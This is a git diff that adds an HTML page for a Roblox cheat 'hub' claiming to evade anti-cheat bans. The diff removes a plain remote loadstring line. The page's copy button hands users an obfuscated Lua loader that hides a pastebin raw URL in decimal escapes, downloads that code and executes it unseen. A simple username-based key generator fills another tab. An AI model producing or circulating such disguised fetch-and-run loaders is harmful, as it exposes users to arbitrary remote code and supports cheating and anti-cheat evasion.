@@ -1,1 +1,184 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef127382/99daysloader.github.io/refs/heads/main/ringta.lua"))()
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VelocityHandler Hub</title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    background-color: #D2B48C; /* 연한갈색 */
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+  }
+
+  main {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  h2 {
+    font-size: 48px;
+    margin-bottom: 15px;
+    color: #fff;
+    text-shadow: 0 0 10px rgba(0,0,0,0.3);
+  }
+
+  p {
+    font-size: 16px;
+    max-width: 500px;
+    text-align: center;
+    margin-bottom: 25px;
+  }
+
+  .download-btn {
+    display: inline-block;
+    background: rgba(150,140,255,0.8);
+    color: #fff;
+    padding: 12px 25px;
+    border-radius: 10px;
+    font-size: 16px;
+    text-decoration: none;
+    font-weight: bold;
+    transition: all 0.3s;
+    box-shadow: 0 0 15px rgba(150,140,255,0.6);
+    cursor: pointer;
+  }
+
+  .download-btn:disabled {
+    background: gray;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+
+  .download-btn:hover:enabled {
+    background: rgba(200,190,255,0.9);
+    box-shadow: 0 0 25px rgba(200,190,255,0.8);
+    transform: scale(1.05);
+  }
+
+  /* 하단 막대 */
+  .bottom-bar {
+    height: 70px;
+    background-color: #C19A6B; /* H라색 */
+    border-radius: 20px 20px 0 0;
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
+  }
+
+  .tab {
+    flex: 1;
+    text-align: center;
+    font-size: 18px;
+    color: #fff;
+    cursor: pointer;
+    padding: 10px 0;
+    transition: background 0.3s;
+  }
+
+  .tab.active {
+    background: rgba(255,255,255,0.2);
+    border-radius: 15px;
+  }
+
+  /* 탭 컨텐츠 */
+  .tab-content {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .tab-content.active {
+    display: flex;
+  }
+</style>
+</head>
+<body>
+<main>
+  <!-- HUB 탭 내용 -->
+  <div id="hubTab" class="tab-content active">
+    <h2>VelocityHandler HUB</h2>
+    <p>This hub can be used even in towers with all-kill anti-cheat without getting banned!</p>
+    <button class="download-btn" onclick="copyScript()">Copy for script ⬇️</button>
+  </div>
+
+  <!-- SCRIPT 탭 내용 -->
+  <div id="scriptTab" class="tab-content">
+    <h2>Script Section</h2>
+    <p>Scripts will appear here.</p>
+  </div>
+
+  <!-- KEY 탭 내용 -->
+  <div id="keyTab" class="tab-content">
+    <h2>Key Generator</h2>
+    <input type="text" id="username" placeholder="Enter your Roblox username" class="key-input">
+    <button class="download-btn" id="createKeyBtn" onclick="createKey()" disabled>Generate Key</button>
+    <p id="generatedKey"></p>
+  </div>
+</main>
+
+<!-- 하단 탭 -->
+<div class="bottom-bar">
+  <div class="tab active" onclick="openTab('hub')">HUB</div>
+  <div class="tab" onclick="openTab('script')">SCRIPT</div>
+  <div class="tab" onclick="openTab('key')">KEY</div>
+</div>
+
+<script>
+  const createKeyBtn = document.getElementById("createKeyBtn");
+  const usernameInput = document.getElementById("username");
+
+  usernameInput.addEventListener("input", () => {
+    createKeyBtn.disabled = usernameInput.value.trim() === "";
+  });
+
+  function copyScript() {
+    const s = `local x={HDD=loadstring,GHD=function(u)return game:HttpGet(u)end}
+local z="\\104\\116\\116\\112\\115\\58\\47\\47\\112\\97\\115\\116\\101\\98\\105\\110\\46\\99\\111\\109\\47\\114\\97\\119\\47\\116\\86\\82\\70\\77\\112\\76\\87"
+local function w(s)local t={}for i=1,#s do t[#t+1]=string.char(s:byte(i))end return table.concat(t)end
+local c=x.GHD(w(z))
+x["HDD"](c)()`;
+    const ta = document.createElement("textarea");
+    ta.value = s;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+    alert("Script copied to clipboard!");
+  }
+
+  function createKey() {
+    const username = usernameInput.value.trim();
+    if(!username) {
+      alert("Please enter your username.");
+      return;
+    }
+    const nameLength = username.length;
+    const digits = username.match(/\d/g) || [];
+    const digitSum = digits.reduce((sum,d) => sum + parseInt(d), 0);
+    const keyBase = nameLength + digitSum;
+    const secondChar = username[1] || "";
+    const finalKey = secondChar + keyBase;
+    document.getElementById("generatedKey").innerText = "Your Key: " + finalKey;
+  }
+
+  function openTab(tabName) {
+    const tabs = ['hub','script','key'];
+    tabs.forEach(t => {
+      document.getElementById(t+'Tab').classList.remove('active');
+      document.querySelector(`.bottom-bar .tab:nth-child(${tabs.indexOf(t)+1})`).classList.remove('active');
+    });
+    document.getElementById(tabName+'Tab').classList.add('active');
+    document.querySelector(`.bottom-bar .tab:nth-child(${tabs.indexOf(tabName)+1})`).classList.add('active');
+  }
+</script>
+</body>
+</html>
